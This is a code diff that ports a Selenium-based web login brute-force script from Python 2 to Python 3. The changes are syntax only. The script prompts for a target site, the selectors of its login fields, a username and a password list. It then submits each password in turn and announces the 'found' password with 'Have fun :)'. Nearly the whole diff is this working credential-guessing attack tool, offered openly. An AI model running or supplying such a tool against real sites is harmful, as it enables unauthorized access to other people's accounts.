@@ -46,9 +46,9 @@ CHROME_DVR_DIR = 'C:\webdrivers\chromedriver.exe'
 
 def wizard():
     print (banner)
-    website = raw_input(color.GREEN + color.BOLD + '\n[~] ' + color.CWHITE + 'Enter a website: ')
-    sys.stdout.write(color.GREEN + '[!] '+color.CWHITE + 'Checking if site exists '),
-    sys.stdout.flush()
+    website = input(color.GREEN + color.BOLD + '\n[~] ' + color.CWHITE + 'Enter a website: ')
+    print(color.GREEN + '[!] '+color.CWHITE + 'Checking if site exists '),
+
     t.sleep(1)
     try:
         request = requests.get(website)
@@ -67,11 +67,11 @@ def wizard():
         print (color.RED + '[!]'+color.CWHITE+ ' Website could not be located make sure to use http / https')
         exit()
 
-    username_selector = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username selector: ')
-    password_selector = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the password selector: ')
-    login_btn_selector = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the Login button selector: ')
-    username = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username to brute-force: ')
-    pass_list = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter a directory to a password list: ')
+    username_selector = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username selector: ')
+    password_selector = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the password selector: ')
+    login_btn_selector = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the Login button selector: ')
+    username = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username to brute-force: ')
+    pass_list = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter a directory to a password list: ')
     brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)
 
 def brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website):
@@ -95,17 +95,17 @@ def brutes(username, username_selector ,password_selector,login_btn_selector,pas
                 Sel_user.send_keys(username)
                 Sel_pas.send_keys(line)
                 t.sleep(5)
-                print '------------------------'
+                print('------------------------')
                 print (color.GREEN + 'Tried password: '+color.RED + line + color.GREEN + 'for user: '+color.RED+ username)
-                print '------------------------'
-                temp = line 
+                print('------------------------')
+                temp = line
         except KeyboardInterrupt: #returns to main menu if ctrl C is used
             exit()
         except selenium.common.exceptions.NoSuchElementException:
-            print 'AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS! '
-            print 'LAST PASS ATTEMPT BELLOW'
-            print color.GREEN + 'Password has been found: {0}'.format(temp)
-            print color.YELLOW + 'Have fun :)'
+            print('AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS! ')
+            print('LAST PASS ATTEMPT BELLOW')
+            print(color.GREEN + 'Password has been found: {0}'.format(temp))
+            print(color.YELLOW + 'Have fun :)')
             exit()
 
 
@@ -142,5 +142,5 @@ password_selector = options.passsel
 login_btn_selector = options.loginsel
 website = options.website
 pass_list = options.passlist
-print banner
+print(banner)
 brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)
